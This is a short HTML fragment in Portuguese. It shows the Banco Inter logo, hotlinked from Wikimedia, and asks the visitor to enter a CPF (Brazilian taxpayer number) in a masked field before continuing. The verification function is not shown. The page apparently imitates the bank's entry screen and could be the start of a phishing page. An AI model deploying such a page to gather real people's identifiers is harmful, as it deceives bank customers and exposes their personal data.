<br>
<h4><img class="center" src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Logo-banco-inter-degrade.png" alt="Logo Banco Inter"></h4>
<br>
<center>
    <p class="flow-text">PARA COMEÇAR, INSIRA SEU CPF</p>
</center>
<div class="row">
    <div class="container">
        <div class="row">
            <div class="col s1"></div>
            <div class="col s10">
                <input type="text" id="CPF" maxlength="14" style="text-align:center;">
            </div>
            <div class="col s1">

            <a onclick="verificaCliente()" href="#"><i style="font-size: 40px;color: orange; padding-top: 10px; padding-left: 0px; margin-left: 0px" class="material-icons">arrow_forward</i></a>
            </div>
        </div>
        <center>
            <span class="helper-text" data-error="wrong" data-success="right">Ocorreu um erro.</span>
        </center>
    </div>
</div>
<script>
    $(document).ready(function () {
        var $seuCampoCpf = $("#CPF");
        $seuCampoCpf.mask('000.000.000-00', { reverse: true });
    });
</script>